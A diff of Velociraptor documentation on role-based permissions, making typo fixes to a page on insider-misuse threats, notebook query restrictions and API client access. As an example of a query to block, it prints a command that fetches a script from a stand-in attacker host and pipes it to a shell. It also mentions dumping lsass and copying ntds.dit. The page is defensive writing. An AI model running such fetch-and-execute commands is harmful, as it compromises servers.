@@ -22,7 +22,7 @@ A malicious Velociraptor user can look at existing collected data, which might c
 
 ### Collecting additional information from endpoints
 
-The next level of threat is actual collection of new information. Some forensic information is very sensitive, and adversaries may actively collect it (for example copy out **ntds.dit **for [offline cracking](https://attack.mitre.org/techniques/T1003/) or dump out **lsass** memory for offline [credential recovery](https://www.onlinehashcrack.com/how-to-procdump-mimikatz-credentials.php)). A legitimate investigator would rarely need to perform these actions, but collecting files and dumping memory are normal routine forensic artifacts that are typically collected in the course of an investigation.
+The next level of threat is actual collection of new information. Some forensic information is very sensitive, and adversaries may actively collect it (for example copy out **ntds.dit** for [offline cracking](https://attack.mitre.org/techniques/T1003/) or dump out **lsass** memory for offline [credential recovery](https://www.onlinehashcrack.com/how-to-procdump-mimikatz-credentials.php)). A legitimate investigator would rarely need to perform these actions, but collecting files and dumping memory are normal routine forensic artifacts that are typically collected in the course of an investigation.
 
 Clearly being able to misuse these artifact collections is a significant threat.
 
@@ -69,7 +69,7 @@ It is a perfectly valid post processing query and should be allowed, even inside
 However the query
 
 ```
- SELECT * FROM execve(argv=[“bash”, “-c”, “curl [http://evil.com](http://evil.com) | sh”])
+ SELECT * FROM execve(argv=[“bash”, “-c”, “curl http://evil.com | sh”])
 ```
 
 Is clearly a malicious query and should be blocked from the notebook (It can result in server compromise).
@@ -98,7 +98,7 @@ Let’s see Bob browsing the Virtual Filesystem of an endpoint
 
 The rest of the GUI does not allow Bob to actually collect any new data — for example the VFS view does not allow collecting new directory listing or new files (but Bob can still navigate already collected directories).
 
-If Bob wants to collect new artifacts or perform new hunts, he will need to ask **investigatoralice** who has the **investigator** role to actually collect those. Similarly, if Bob wants to modify or implement a new artifact they will need to **sue** who has the **artifact_writer** role to be able to add the artifacts for him (Once the artifact is added, alice can now collect it — she just can’t add it herself).
+If Bob wants to collect new artifacts or perform new hunts, he will need to ask **investigatoralice** who has the **investigator** role to actually collect those. Similarly, if Bob wants to modify or implement a new artifact they will need to ask the user **sue** who has the **artifact_writer** role to be able to add the artifacts for him (Once the artifact is added, Alice can now collect it — she just can’t add it herself).
 
 ### Artifact permissions
 
@@ -118,7 +118,7 @@ The artifact definition itself specifies that this artifact requires the EXECVE 
 
 Velociraptor refuses to schedule this artifact collection since alice does not have the execve permission (This is only available to administrators). Therefore only administrators can issue arbitrary commands on the endpoint.
 
-Lets have a look a the available permissions (Permissions might evolve over time, but these are the defined permissions at this time)
+Lets have a look at the available permissions (Permissions might evolve over time, but these are the defined permissions at this time)
 
 ![[https://github.com/Velocidex/velociraptor/blob/master/acls/proto/acl.proto](https://github.com/Velocidex/velociraptor/blob/master/acls/proto/acl.proto#L9)](../img/1pbqvWfXG2Gtg-cBuWGYqVw.png)*[https://github.com/Velocidex/velociraptor/blob/master/acls/proto/acl.proto](https://github.com/Velocidex/velociraptor/blob/master/acls/proto/acl.proto#L9)*
 
@@ -126,7 +126,7 @@ Lets have a look a the available permissions (Permissions might evolve over time
 
 We have previously shown how Velociraptor can be accessed through the API. The Velociraptor API is very simple — it simply offers a single gRPC method called **Query** which allows clients to run arbitrary VQL queries on the server.
 
-Previously there was no access controls on the VQL issue by the API client, so an API client could run any VQL queries. Typically API clients are used to automate post processing of hunts and flow and so they rarely need more sophisticated permissions.
+Previously there was no access controls on the VQL issue by the API client, so an API client could run any VQL queries. Typically API clients are used to automate post processing of hunts and flows and so they rarely need more sophisticated permissions.
 
 It is now possible (even required) to limit the access of API clients by assigning them specific permissions depending on the queries they typically need to run.
 
